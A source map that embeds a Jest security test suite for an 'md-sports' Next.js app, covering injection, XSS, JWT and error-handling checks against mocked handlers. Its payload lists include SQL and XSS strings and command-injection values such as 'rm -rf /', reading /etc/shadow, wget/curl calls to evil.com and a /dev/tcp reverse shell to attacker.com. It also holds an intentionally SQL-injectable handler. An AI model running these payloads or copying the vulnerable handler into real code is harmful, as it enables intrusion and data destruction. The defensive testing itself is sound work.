{"version":3,"sources":["/Users/sachin/Documents/md-sports-/tests/security/security.test.ts"],"sourcesContent":["import { describe, it, expect, beforeAll, afterAll, beforeEach } from '@jest/globals';\nimport jwt from 'jsonwebtoken';\nimport bcrypt from 'bcryptjs';\nimport crypto from 'crypto';\n\n// Mock NextResponse\nconst NextResponse = {\n  json: (data: any, init?: ResponseInit) => ({\n    json: async () => data,\n    status: init?.status || 200,\n    headers: new Headers(init?.headers),\n  }),\n  redirect: (url: string, status?: number) => ({\n    status: status || 302,\n    headers: new Headers({ Location: url }),\n  }),\n};\n\n// Helper function to create mock NextRequest\nconst createMockNextRequest = (url: string, options: {\n  method?: string;\n  body?: any;\n  headers?: Record<string, string>;\n} = {}): any => {\n  const { method = 'GET', body, headers = {} } = options;\n  return {\n    method,\n    url,\n    headers: new Headers(headers),\n    json: async () => body ? (typeof body === 'string' ? JSON.parse(body) : body) : {},\n    text: async () => body ? (typeof body === 'string' ? body : JSON.stringify(body)) : '',\n  };\n};\n\n// Security test utilities\nclass SecurityTestUtils {\n  static generateSQLInjectionPayloads(): string[] {\n    return [\n      \"'; DROP TABLE users; --\",\n      \"' OR '1'='1\",\n      \"' UNION SELECT * FROM users --\",\n      \"'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'password'); --\",\n      \"' OR 1=1 --\",\n      \"admin'--\",\n      \"admin'/*\",\n      \"' OR 'x'='x\",\n      \"') OR ('1'='1\",\n      \"' OR 1=1#\",\n    ];\n  }\n\n  static generateXSSPayloads(): string[] {\n    return [\n      \"<script>alert('XSS')</script>\",\n      \"javascript:alert('XSS')\",\n      \"<img src=x onerror=alert('XSS')>\",\n      \"<svg onload=alert('XSS')>\",\n      \"<iframe src=javascript:alert('XSS')></iframe>\",\n      \"<body onload=alert('XSS')>\",\n      \"<input onfocus=alert('XSS') autofocus>\",\n      \"<select onfocus=alert('XSS') autofocus>\",\n      \"<textarea onfocus=alert('XSS') autofocus>\",\n      \"<keygen onfocus=alert('XSS') autofocus>\",\n    ];\n  }\n\n  static generateCommandInjectionPayloads(): string[] {\n    return [\n      \"; ls -la\",\n      \"| cat /etc/passwd\",\n      \"&& rm -rf /\",\n      \"; cat /etc/shadow\",\n      \"| nc -l 4444\",\n      \"; wget http://evil.com/malware\",\n      \"&& curl http://evil.com/steal-data\",\n      \"; python -c 'import os; os.system(\\\"rm -rf /\\\")'\",\n      \"| bash -i >& /dev/tcp/attacker.com/8080 0>&1\",\n      \"; /bin/bash\",\n    ];\n  }\n\n  static generateLongStrings(): string[] {\n    return [\n      'A'.repeat(1000),\n      'A'.repeat(10000),\n      'A'.repeat(100000),\n      '\\x00'.repeat(1000), // Null bytes\n      '\\n'.repeat(1000), // Newlines\n      '\\r'.repeat(1000), // Carriage returns\n    ];\n  }\n\n  static generateInvalidTokens(): string[] {\n    return [\n      'invalid.token.here',\n      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',\n      '', // Empty token\n      'Bearer', // Just Bearer\n      'null',\n      'undefined',\n      '{}',\n      'admin',\n      '../../etc/passwd',\n      '<script>alert(\"xss\")</script>',\n    ];\n  }\n\n  static async hashPassword(password: string): Promise<string> {\n    return bcrypt.hash(password, 10);\n  }\n\n  static generateValidJWT(payload: any, secret: string = 'test-secret'): string {\n    return jwt.sign(payload, secret, { expiresIn: '1h' });\n  }\n\n  static generateExpiredJWT(payload: any, secret: string = 'test-secret'): string {\n    return jwt.sign(payload, secret, { expiresIn: '-1h' });\n  }\n}\n\n// Mock API handlers for security testing\nconst mockPrisma = {\n  user: {\n    findUnique: jest.fn(),\n    findMany: jest.fn(),\n    create: jest.fn(),\n    update: jest.fn(),\n  },\n  product: {\n    findMany: jest.fn(),\n    create: jest.fn(),\n  },\n  $queryRaw: jest.fn(),\n  $executeRaw: jest.fn(),\n};\n\n// Mock vulnerable endpoint for testing\nconst vulnerableSearchHandler = async (req: NextRequest) => {\n  const url = new URL(req.url);\n  const query = url.searchParams.get('q');\n  \n  if (!query) {\n    return NextResponse.json({ error: 'Query required' }, { status: 400 });\n  }\n\n  // Simulate SQL injection vulnerability (for testing purposes)\n  try {\n    // This would be vulnerable in real code - DON'T DO THIS\n    const results = await mockPrisma.$queryRaw`\n      SELECT * FROM products WHERE name LIKE '%${query}%'\n    `;\n    \n    return NextResponse.json({ results });\n  } catch (error) {\n    return NextResponse.json({ error: 'Database error' }, { status: 500 });\n  }\n};\n\n// Secure search handler for comparison\nconst secureSearchHandler = async (req: NextRequest) => {\n  const url = new URL(req.url);\n  const query = url.searchParams.get('q');\n  \n  if (!query) {\n    return NextResponse.json({ error: 'Query required' }, { status: 400 });\n  }\n\n  // Input validation\n  if (query.length > 100) {\n    return NextResponse.json({ error: 'Query too long' }, { status: 400 });\n  }\n\n  // Sanitize input\n  const sanitizedQuery = query.replace(/[<>\"'&]/g, '');\n  \n  try {\n    // Use parameterized queries\n    const results = await mockPrisma.product.findMany({\n      where: {\n        name: {\n          contains: sanitizedQuery,\n          mode: 'insensitive',\n        },\n      },\n    });\n    \n    return NextResponse.json({ results });\n  } catch (error) {\n    return NextResponse.json({ error: 'Database error' }, { status: 500 });\n  }\n};\n\n// Authentication handler with security measures\nconst secureAuthHandler = async (req: NextRequest) => {\n  const body = await req.json();\n  const { email, password } = body;\n\n  // Rate limiting simulation\n  const clientIP = req.headers.get('x-forwarded-for') || 'unknown';\n  \n  // Input validation\n  if (!email || !password) {\n    return NextResponse.json(\n      { error: 'Email and password are required' },\n      { status: 400 }\n    );\n  }\n\n  if (email.length > 254 || password.length > 128) {\n    return NextResponse.json(\n      { error: 'Input too long' },\n      { status: 400 }\n    );\n  }\n\n  // Email format validation\n  const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;\n  if (!emailRegex.test(email)) {\n    return NextResponse.json(\n      { error: 'Invalid email format' },\n      { status: 400 }\n    );\n  }\n\n  // Check for suspicious patterns\n  const suspiciousPatterns = [\n    /<script/i,\n    /javascript:/i,\n    /on\\w+=/i,\n    /\\bor\\b.*\\b1\\s*=\\s*1\\b/i,\n    /union.*select/i,\n    /drop.*table/i,\n  ];\n\n  const isSuspicious = suspiciousPatterns.some(pattern => \n    pattern.test(email) || pattern.test(password)\n  );\n\n  if (isSuspicious) {\n    return NextResponse.json(\n      { error: 'Invalid input detected' },\n      { status: 400 }\n    );\n  }\n\n  try {\n    const user = await mockPrisma.user.findUnique({\n      where: { email },\n    });\n\n    if (!user) {\n      // Constant time delay to prevent timing attacks\n      await new Promise(resolve => setTimeout(resolve, 100));\n      return NextResponse.json(\n        { error: 'Invalid credentials' },\n        { status: 401 }\n      );\n    }\n\n    const isValid = await bcrypt.compare(password, user.password);\n    if (!isValid) {\n      return NextResponse.json(\n        { error: 'Invalid credentials' },\n        { status: 401 }\n      );\n    }\n\n    // Generate secure token\n    const token = jwt.sign(\n      { \n        userId: user.id, \n        email: user.email,\n        iat: Math.floor(Date.now() / 1000),\n      },\n      process.env.JWT_SECRET || 'test-secret',\n      { \n        expiresIn: '15m',\n        issuer: 'md-sports',\n        audience: 'md-sports-client',\n      }\n    );\n\n    return NextResponse.json({\n      user: {\n        id: user.id,\n        email: user.email,\n        name: user.name,\n      },\n      token,\n    });\n  } catch (error) {\n    return NextResponse.json(\n      { error: 'Internal server error' },\n      { status: 500 }\n    );\n  }\n};\n\ndescribe('Security Tests', () => {\n  beforeAll(() => {\n    process.env.JWT_SECRET = 'test-secret-key-for-security-testing';\n  });\n\n  beforeEach(() => {\n    jest.clearAllMocks();\n  });\n\n  describe('SQL Injection Protection', () => {\n    it('should prevent SQL injection in search queries', async () => {\n      const sqlPayloads = SecurityTestUtils.generateSQLInjectionPayloads();\n      \n      for (const payload of sqlPayloads) {\n        const request = createMockNextRequest(\n          `http://localhost:3000/api/search?q=${encodeURIComponent(payload)}`\n        );\n\n        // Test with secure handler\n        const response = await secureSearchHandler(request);\n        \n        // Should not return 500 error or expose database structure\n        expect(response.status).not.toBe(500);\n        \n        const data = await response.json();\n        expect(data).not.toHaveProperty('results');\n      }\n    });\n\n    it('should use parameterized queries', async () => {\n      mockPrisma.product.findMany.mockResolvedValue([]);\n      \n      const request = createMockNextRequest(\n        \"http://localhost:3000/api/search?q=test' OR '1'='1\"\n      );\n\n      await secureSearchHandler(request);\n      \n      // Verify parameterized query was used\n      expect(mockPrisma.product.findMany).toHaveBeenCalledWith({\n        where: {\n          name: {\n            contains: \"test OR 11\", // Sanitized\n            mode: 'insensitive',\n          },\n        },\n      });\n    });\n  });\n\n  describe('XSS Protection', () => {\n    it('should sanitize XSS payloads in input', async () => {\n      const xssPayloads = SecurityTestUtils.generateXSSPayloads();\n      \n      for (const payload of xssPayloads) {\n        const request = createMockNextRequest(\n          `http://localhost:3000/api/search?q=${encodeURIComponent(payload)}`\n        );\n\n        const response = await secureSearchHandler(request);\n        const data = await response.json();\n        \n        // Should not contain script tags or javascript\n        if (data.results) {\n          const responseStr = JSON.stringify(data);\n          expect(responseStr).not.toMatch(/<script/i);\n          expect(responseStr).not.toMatch(/javascript:/i);\n          expect(responseStr).not.toMatch(/on\\w+=/i);\n        }\n      }\n    });\n\n    it('should reject suspicious input patterns', async () => {\n      const request = createMockNextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: {\n          email: '<script>alert(\"xss\")</script>@test.com',\n          password: 'password123',\n        },\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n\n      const response = await secureAuthHandler(request);\n      const data = await response.json();\n      \n      expect(response.status).toBe(400);\n      expect(data.error).toBe('Invalid input detected');\n    });\n  });\n\n  describe('Authentication Security', () => {\n    it('should reject invalid JWT tokens', async () => {\n      const invalidTokens = SecurityTestUtils.generateInvalidTokens();\n      \n      for (const token of invalidTokens) {\n        expect(() => {\n          jwt.verify(token, process.env.JWT_SECRET!);\n        }).toThrow();\n      }\n    });\n\n    it('should reject expired tokens', async () => {\n      const expiredToken = SecurityTestUtils.generateExpiredJWT({\n        userId: 1,\n        email: 'test@example.com',\n      });\n      \n      expect(() => {\n        jwt.verify(expiredToken, process.env.JWT_SECRET!);\n      }).toThrow('jwt expired');\n    });\n\n    it('should use secure password hashing', async () => {\n      const password = 'testpassword123';\n      const hash = await SecurityTestUtils.hashPassword(password);\n      \n      // Should be bcrypt hash\n      expect(hash).toMatch(/^\\$2[aby]\\$\\d+\\$/);\n      \n      // Should not be the original password\n      expect(hash).not.toBe(password);\n      \n      // Should verify correctly\n      const isValid = await bcrypt.compare(password, hash);\n      expect(isValid).toBe(true);\n      \n      // Should not verify with wrong password\n      const isInvalid = await bcrypt.compare('wrongpassword', hash);\n      expect(isInvalid).toBe(false);\n    });\n\n    it('should prevent timing attacks in authentication', async () => {\n      const validEmail = 'test@example.com';\n      const invalidEmail = 'nonexistent@example.com';\n      \n      // Mock user lookup\n      mockPrisma.user.findUnique.mockImplementation(({ where }) => {\n        if (where.email === validEmail) {\n          return Promise.resolve({\n            id: 1,\n            email: validEmail,\n            password: '$2a$10$hashedPassword',\n            name: 'Test User',\n          });\n        }\n        return Promise.resolve(null);\n      });\n\n      const validRequest = createMockNextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: {\n          email: validEmail,\n          password: 'wrongpassword',\n        },\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n\n      const invalidRequest = createMockNextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: {\n          email: invalidEmail,\n          password: 'wrongpassword',\n        },\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n\n      // Measure response times\n      const start1 = Date.now();\n      const response1 = await secureAuthHandler(validRequest);\n      const time1 = Date.now() - start1;\n\n      const start2 = Date.now();\n      const response2 = await secureAuthHandler(invalidRequest);\n      const time2 = Date.now() - start2;\n\n      // Both should return 401\n      expect(response1.status).toBe(401);\n      expect(response2.status).toBe(401);\n      \n      // Response times should be similar (within 50ms)\n      expect(Math.abs(time1 - time2)).toBeLessThan(50);\n    });\n  });\n\n  describe('Input Validation', () => {\n    it('should reject oversized inputs', async () => {\n      const longStrings = SecurityTestUtils.generateLongStrings();\n      \n      for (const longString of longStrings) {\n        const request = createMockNextRequest('http://localhost:3000/api/auth/login', {\n          method: 'POST',\n          body: {\n            email: longString,\n            password: 'password123',\n          },\n          headers: {\n            'Content-Type': 'application/json',\n          },\n        });\n\n        const response = await secureAuthHandler(request);\n        \n        expect(response.status).toBe(400);\n      }\n    });\n\n    it('should validate email format', async () => {\n      const invalidEmails = [\n        'invalid-email',\n        '@domain.com',\n        'user@',\n        'user..name@domain.com',\n        'user@domain',\n        '',\n        'user name@domain.com',\n      ];\n      \n      for (const email of invalidEmails) {\n        const request = createMockNextRequest('http://localhost:3000/api/auth/login', {\n          method: 'POST',\n          body: {\n            email,\n            password: 'password123',\n          },\n          headers: {\n            'Content-Type': 'application/json',\n          },\n        });\n\n        const response = await secureAuthHandler(request);\n        const data = await response.json();\n        \n        expect(response.status).toBe(400);\n        expect(data.error).toBe('Invalid email format');\n      }\n    });\n\n    it('should handle null bytes and special characters', async () => {\n      const maliciousInputs = [\n        'test\\x00@example.com',\n        'test\\r\\n@example.com',\n        'test\\t@example.com',\n        'test\\b@example.com',\n      ];\n      \n      for (const input of maliciousInputs) {\n        const request = createMockNextRequest('http://localhost:3000/api/auth/login', {\n          method: 'POST',\n          body: {\n            email: input,\n            password: 'password123',\n          },\n          headers: {\n            'Content-Type': 'application/json',\n          },\n        });\n\n        const response = await secureAuthHandler(request);\n        \n        expect(response.status).toBe(400);\n      }\n    });\n  });\n\n  describe('Command Injection Protection', () => {\n    it('should prevent command injection in file operations', () => {\n      const commandPayloads = SecurityTestUtils.generateCommandInjectionPayloads();\n      \n      for (const payload of commandPayloads) {\n        // Simulate file name validation\n        const isValidFileName = (filename: string): boolean => {\n          // Only allow alphanumeric, dots, hyphens, and underscores\n          return /^[a-zA-Z0-9._-]+$/.test(filename);\n        };\n        \n        expect(isValidFileName(payload)).toBe(false);\n      }\n    });\n  });\n\n  describe('JWT Security', () => {\n    it('should use secure JWT configuration', () => {\n      const payload = { userId: 1, email: 'test@example.com' };\n      const token = SecurityTestUtils.generateValidJWT(payload);\n      \n      const decoded = jwt.verify(token, process.env.JWT_SECRET!) as any;\n      \n      expect(decoded.userId).toBe(1);\n      expect(decoded.email).toBe('test@example.com');\n      expect(decoded.iat).toBeDefined();\n      expect(decoded.exp).toBeDefined();\n    });\n\n    it('should not accept tokens with none algorithm', () => {\n      // Create a token with 'none' algorithm (security vulnerability)\n      const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');\n      const payload = Buffer.from(JSON.stringify({ userId: 1, email: 'test@example.com' })).toString('base64url');\n      const noneToken = `${header}.${payload}.`;\n      \n      expect(() => {\n        jwt.verify(noneToken, process.env.JWT_SECRET!);\n      }).toThrow();\n    });\n\n    it('should validate token signature', () => {\n      const validToken = SecurityTestUtils.generateValidJWT({ userId: 1 });\n      const [header, payload] = validToken.split('.');\n      const tamperedToken = `${header}.${payload}.tampered_signature`;\n      \n      expect(() => {\n        jwt.verify(tamperedToken, process.env.JWT_SECRET!);\n      }).toThrow('invalid signature');\n    });\n  });\n\n  describe('Rate Limiting Simulation', () => {\n    it('should handle rapid successive requests', async () => {\n      const requests = Array.from({ length: 100 }, () => \n        createMockNextRequest('http://localhost:3000/api/auth/login', {\n          method: 'POST',\n          body: {\n            email: 'test@example.com',\n            password: 'password123',\n          },\n          headers: {\n            'Content-Type': 'application/json',\n            'X-Forwarded-For': '192.168.1.100',\n          },\n        })\n      );\n\n      // In a real implementation, this would trigger rate limiting\n      const responses = await Promise.all(\n        requests.map(req => secureAuthHandler(req))\n      );\n\n      // All requests should be processed (in real app, some would be rate limited)\n      responses.forEach(response => {\n        expect([400, 401, 429]).toContain(response.status); // 429 = Too Many Requests\n      });\n    });\n  });\n\n  describe('Error Handling Security', () => {\n    it('should not expose sensitive information in error messages', async () => {\n      // Simulate database error\n      mockPrisma.user.findUnique.mockRejectedValue(new Error('Connection failed to database \"md_sports\" on host \"localhost\"'));\n      \n      const request = createMockNextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: {\n          email: 'test@example.com',\n          password: 'password123',\n        },\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n\n      const response = await secureAuthHandler(request);\n      const data = await response.json();\n      \n      expect(response.status).toBe(500);\n      expect(data.error).toBe('Internal server error');\n      expect(data.error).not.toContain('database');\n      expect(data.error).not.toContain('localhost');\n      expect(data.error).not.toContain('md_sports');\n    });\n\n    it('should use generic error messages for authentication failures', async () => {\n      mockPrisma.user.findUnique.mockResolvedValue(null);\n      \n      const request = createMockNextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: {\n          email: 'nonexistent@example.com',\n          password: 'password123',\n        },\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n\n      const response = await secureAuthHandler(request);\n      const data = await response.json();\n      \n      expect(response.status).toBe(401);\n      expect(data.error).toBe('Invalid credentials');\n      expect(data.error).not.toContain('user not found');\n      expect(data.error).not.toContain('email');\n    });\n  });\n});"],"names":["NextResponse","json","data","init","status","headers","Headers","redirect","url","Location","createMockNextRequest","options","method","body","JSON","parse","text","stringify","SecurityTestUtils","generateSQLInjectionPayloads","generateXSSPayloads","generateCommandInjectionPayloads","generateLongStrings","repeat","generateInvalidTokens","hashPassword","password","bcrypt","hash","generateValidJWT","payload","secret","jwt","sign","expiresIn","generateExpiredJWT","mockPrisma","user","findUnique","jest","fn","findMany","create","update","product","$queryRaw","$executeRaw","vulnerableSearchHandler","req","URL","query","searchParams","get","error","results","secureSearchHandler","length","sanitizedQuery","replace","where","name","contains","mode","secureAuthHandler","email","clientIP","emailRegex","test","suspiciousPatterns","isSuspicious","some","pattern","Promise","resolve","setTimeout","isValid","compare","token","userId","id","iat","Math","floor","Date","now","process","env","JWT_SECRET","issuer","audience","describe","beforeAll","beforeEach","clearAllMocks","it","sqlPayloads","request","encodeURIComponent","response","expect","not","toBe","toHaveProperty","mockResolvedValue","toHaveBeenCalledWith","xssPayloads","responseStr","toMatch","invalidTokens","verify","toThrow","expiredToken","isInvalid","validEmail","invalidEmail","mockImplementation","validRequest","invalidRequest","start1","response1","time1","start2","response2","time2","abs","toBeLessThan","longStrings","longString","invalidEmails","maliciousInputs","input","commandPayloads","isValidFileName","filename","decoded","toBeDefined","exp","header","Buffer","from","alg","typ","toString","noneToken","validToken","split","tamperedToken","requests","Array","responses","all","map","forEach","toContain","mockRejectedValue","Error"],"mappings":"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